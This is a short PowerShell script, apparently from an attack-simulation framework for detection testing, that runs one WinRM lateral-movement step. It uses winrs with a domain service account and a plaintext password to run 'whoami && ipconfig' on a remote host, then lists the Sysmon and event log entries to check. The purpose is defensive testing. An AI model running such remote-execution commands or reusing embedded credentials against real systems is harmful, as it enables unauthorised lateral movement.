# CADRE — WT085 — WinRM Lateral Movement
. ..\windows\lib\cadre-env.ps1
. ..\windows\lib\common.ps1
print_banner "WT085 - WinRM Lateral Movement"
start_attack "085" "WinRM Lateral Movement"
step "Remote command execution via WinRM"
run_cmd "winrs -r:mbr01 -u:CHILD\svc_mssql -p:s3rv1c3_MSSQL! 'whoami && ipconfig'"
result 0 "WT085 — check Sysmon EID 1 (winrs.exe), 4688, WinRM ops log"
